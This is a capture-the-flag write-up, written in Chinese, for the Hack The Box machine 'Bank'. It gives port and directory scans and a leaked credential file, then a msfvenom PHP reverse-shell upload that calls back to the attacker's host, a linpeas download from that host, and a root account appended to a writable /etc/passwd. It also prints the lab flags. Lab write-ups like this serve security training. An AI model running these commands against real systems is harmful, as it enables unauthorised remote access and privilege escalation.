###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Bank

```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.34.46 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.34.46:22
Open 10.129.34.46:53
Open 10.129.34.46:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMJ+YATka9wvs0FTz8iNWs6uCiLqSFhmBYoYAorFpozVGkCkU1aEJ7biybFTw/qzS9pbSsaYA+3LyUyvh3BSPGEt1BgGW/H29MuXjkznwVz60JqL4GqaJzYSL3smYYdr3KdJQI/QSvf34WU3pife6LRmJaVk+ETh3wPclyecNtedAAAAFQC1Zb2O2LzvAWf20FdsK8HRPlrx1wAAAIBIBAhLmVd3Tz+o+6Oz39g4Um1le8d3DETINWk3myRvPw8hcnRwAFe1+14h3RX4fr+LKXoR/tYrI138PJyiyl+YtQWhZnJ7j8lqnKRU2YibtnUc44kP9FhUqeAcBNjj4qwG9GyQSWm/Q5CbOokgaa6WfdcnwsUMim0h2Ad8YdU1kAAAAIBy3dOOD8jKHeBdE/oXGG0X9tKSFZv1gPr/kZ7NfqUF0kHU3oZTNK8/2qR0SNHgrZ2cLgKTIuneGS8lauXjC66NNMoUkJcMHpwRkYC0A86LDmhES6OuPsQwAjr1AtUZn97QjYu1d6WPfhTdsRYBuCotgKh2SBkzV1Bcz77Tnp56JA==
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc0rofjHtpSlqkDjjnkEiYcbUrMH0Q4a6PcxqsR3updDGBWu/RK7AGWRSjPn13uil/nl44XF/fkULy7FoXXskByLCHP8FS2gYJApQMvI9n81ERojEA0NIi6VZKP19bl1VFTk7Q5rEPIpab2xqYMBayb1ch7iP95n3iayvHEt/7cSTsddGWKeALi+rrujpnryNViiOIWpqDv+RWtbc2Wuc/FTeGSOt1LBTbtKcLwEehBG+Ym8o8iKTd+zfVudu7v1g3W2Aa3zLuTcePRKLUK3Q2D7k+5aJnWrekpiARQm3NmMkv1NuDLeW3amVBCv6DRJPBqEgSeGMGsnqkR8CKHO9/
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH30xnPq1XEub/UFQ2KoHXh9LFKMNMkt60xYF3OrEp1Y5XQd0QyeLXwm6tIqWtb0rWda/ivDgmiB4GzCIMf/HQ=
|   256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA8MYjFyo+4OwYGTzeuyNd998y6cOx56mIuciim1cvKh
53/tcp open  domain  syn-ack ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

先把`bank.htb`加入`/etc/hosts`
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo nano /etc/hosts

10.129.34.46    bank.htb
```

掃描路徑
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://bank.htb/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

uploads                 [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 299ms]
#                       [Status: 302, Size: 7322, Words: 3793, Lines: 189, Duration: 3674ms]
#                       [Status: 302, Size: 7322, Words: 3793, Lines: 189, Duration: 4686ms]
                        [Status: 302, Size: 7322, Words: 3793, Lines: 189, Duration: 4687ms]
assets                  [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 298ms]
inc                     [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 298ms]
                        [Status: 302, Size: 7322, Words: 3793, Lines: 189, Duration: 303ms]
server-status           [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 298ms]
balance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 298ms]
:: Progress: [220560/220560] :: Job [1/1] :: 133 req/sec :: Duration: [0:29:35] :: Errors: 0 ::
```

前往`http://bank.htb/balance-transfer/`把所有檔案下載下來，然後找到沒有`++OK ENCRYPT SUCCESS`的檔案
```
┌──(kali㉿kali)-[~/htb/acc]
└─$ wget -r http://bank.htb/balance-transfer/ 

┌──(kali㉿kali)-[~/htb/acc/bank.htb]
└─$ grep -Lr "++OK ENCRYPT SUCCESS" /home/kali/htb/acc/bank.htb
/home/kali/htb/acc/bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
```

```
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

前往`http://bank.htb/`用`chris@bank.htb`跟密碼`!##HTBB4nkP4ssw0rd!##`登入之後，前往`support.php`的`html`查看可以看到他說用`.htb`會執行成`.php`

![Bank_1.png](picture/Bank_1.png)

新增一個php reverse是`.htb`檔，然後把他上傳之後點他`http://bank.htb/uploads/shell.htb`
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

┌──(kali㉿kali)-[~/htb]
└─$ msfvenom -p php/reverse_php LHOST=10.10.14.70 LPORT=4444 -f raw > shell.htb
```

再開一個reverse才能用`python3 -c 'import pty; pty.spawn("/bin/bash")'`之後就在`/home/chris`得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4445

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@bank:/home/chris$ cat user.txt
426c25e957eba0f5c82d14905386b521
```

用`linpeas.sh`
```
www-data@bank:/tmp$ wget 10.10.14.70/linpeas.sh
www-data@bank:/tmp$ chmod +x linpeas.sh
www-data@bank:/tmp$ ./linpeas.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                             
                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable 
```

發現`/etc/passwd is writable`後直接寫root帳號進去，得root之後在/root得root.txt
```
www-data@bank:/tmp$ echo "toor:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

www-data@bank:/tmp$ su toor
Password: w00t

root@bank:~# cat root.txt
1395d620c278031bb01fc773037248a9
```